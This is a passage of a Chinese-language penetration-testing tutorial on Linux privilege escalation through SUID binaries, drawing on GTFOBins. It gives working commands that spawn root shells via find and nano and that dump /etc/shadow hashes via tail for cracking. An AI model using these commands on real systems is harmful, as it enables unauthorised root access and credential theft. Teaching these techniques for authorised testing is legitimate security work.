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" width="470" height="60" class="img_ev3q"></p>
<p>就这样，我们进入了 root shell 并提升了权限！</p>
<blockquote>
<p>我曾见过有人将命令中的 sh 替换为 bash，以获得更好的 shell，这确实有效。但是，我也见过漏洞利用在 bash 中失败而在 sh 中成功的情况。因此，如果您选择 bash，请务必小心。更好的选择是将 sh 保留在命令中，然后在获得 shell 后立即使用 /bin/bash -p 将其升级为 bash 。</p>
</blockquote>
<p>现在让我们检查 <a href="https://gtfobins.github.io/gtfobins/find/" target="_blank" rel="noopener noreferrer" title="寻找">find</a> 命令并看看 GTFOBins 能为该二进制文件提供什么。</p>
<p>就像上次一样，我们应该首先检查此二进制文件的 SUID 漏洞，它显示以下内容：</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190626425-911117323-14acd430781044f8d99045a583257d80.png" width="821" height="263" class="img_ev3q"></p>
<p>与上次相同，我们不会创建本地副本，而是使用二进制文件的绝对路径。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/find . -exec /bin/sh -p \; -quit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190625354-1218123390-11ccb9baddb50166a30a6b301eef0cb4.png" width="615" height="95" class="img_ev3q"></p>
<p>与上一个例子类似，我们也很快进入了 root shell 并提升了权限</p>
<p>所以说，如果找到设置了 SUID 位的恰当二进制文件，那么提升为 root 权限真的很容易！</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="42利用文件读写二进制文件--tailnano"><strong><div id="id4.2">4.2、利用文件读/写二进制文件 – tail/nano</div></strong><a href="#42利用文件读写二进制文件--tailnano" class="hash-link" aria-label="42利用文件读写二进制文件--tailnano的直接链接" title="42利用文件读写二进制文件--tailnano的直接链接">​</a></h4>
<p>对于下一组示例，我们将研究可用于读取文件或写入文件的 SUID 二进制文件。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="421读取敏感文件--tail"><strong><div id="id4.2.1">4.2.1、读取敏感文件 – tail</div></strong><a href="#421读取敏感文件--tail" class="hash-link" aria-label="421读取敏感文件--tail的直接链接" title="421读取敏感文件--tail的直接链接">​</a></h6>
<p>有许多二进制文件可用于读取文件，包括 <strong>cat、more、less、head、tail 等。</strong> 但在这个例子中，我们将利用 <strong>tail</strong>。</p>
<p>当上面列出的二进制文件之一设置了 SUID 位时，我们可以使用该二进制文件读取通常只有 root 才能查看的敏感文件。</p>
<p>有助于提升权限的敏感文件包括 <strong>/etc/shadow、/root/.ssh/id_rsa</strong>、或标准用户的 <strong>id_rsa</strong> 或我们在枚举过程中发现的任何我们没有权限读取的有趣文件。</p>
<p>让我们回到 GTFOBins 并看看我们可以做些什么来滥用 tail 二进制文件。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190626224-1719227929-eef72597db0ca275847c337469c65f0d.png" width="824" height="465" class="img_ev3q"></p>
<p>在这里我们可以看到 <strong>File Read</strong> 和 <strong>SUID</strong> 部分几乎相同，这是因为只有一种方法可以滥用这个二进制文件。</p>
<p>GTFOBins 喜欢让我们创建一个变量，然后将该变量传递到命令中。但是，我们将稍微改变一下，使用 <strong>tail</strong> 的绝对路径，然后用我们要读取的文件替换 “$LFILE”。</p>
<p>例如，我们可以使用以下命令从影子文件中获取所有哈希值：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/tail -c1G &quot;/etc/shadow&quot; | grep -v &#x27;*\|!&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190625814-1366671911-17b0600d3728f15c98266bda062417da.png" width="1024" height="105" class="img_ev3q"></p>
<p>Amazing！我们能够从影子文件中转储所有哈希值！</p>
<p>现在我们可以获取这些哈希值并尝试使用哈希破解工具（John 或 hashcat）来破解它们。</p>
<blockquote>
<p>要了解如何使用 John the Ripper 破解影子哈希，请查看此处的<a href="https://juggernaut-sec.com/weak-file-permissions/#Cracking_Shadow_Hashes_with_John_the_Ripper" target="_blank" rel="noopener noreferrer" title="这里">帖子</a>。或者，要了解如何使用 hascat 完成此操作，请查看此处的<a href="https://juggernaut-sec.com/password-hunting-lpe/#Cracking_Shadow_Hashes_with_Hashcat" target="_blank" rel="noopener noreferrer" title="这里">帖子</a>。</p>
</blockquote>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="422写入敏感文件--nano"><strong><div id="id4.2.2">4.2.2、写入敏感文件 – nano</div></strong><a href="#422写入敏感文件--nano" class="hash-link" aria-label="422写入敏感文件--nano的直接链接" title="422写入敏感文件--nano的直接链接">​</a></h6>
<p>允许我们写入文件的二进制文件通常包括文本编辑器、调试工具和一些其他二进制文件。</p>
<p>在此示例中，我们将利用文本编辑器 <strong>nano</strong>。</p>
<p>再次，我们需要首先前往 GTFOBins 查看 <a href="https://gtfobins.github.io/gtfobins/nano/" target="_blank" rel="noopener noreferrer" title="纳米">nano</a> 有哪些可用的漏洞。</p>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="337" height="97" class="img_ev3q"></p>
<p>有趣的是，我们只看到了 “Limited SUID” 的漏洞，而没有看到常规的 SUID 漏洞。但是，我们之前了解到，我们不应该局限于只使用 SUID 漏洞。</p>
<p>考虑到这一点，我们应该测试的两个漏洞是 <strong>Shell</strong> 漏洞和 <strong>File Write</strong> 漏洞。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190625625-42525958-9f9cd6b337bca2d0a15bb0c6b53898d0.png" width="822" height="337" class="img_ev3q"></p>
<p>为了尽快取得胜利，我们应该首先测试 shell 漏洞。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/bin/nano</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">^R^X</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">reset; sh 1&gt;&amp;0 2&gt;&amp;0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190625463-1211381588-166c28b50354377c17c44b671853ba9b.png" width="658" height="133" class="img_ev3q"></p>
<p>第一个命令由于有 $ 提示符，看起来可能起了作用，但这个命令却让 shell 崩溃了。</p>
<p>启动新的 SSH 会话后，我们可以测试第二个 shell 命令：</p>
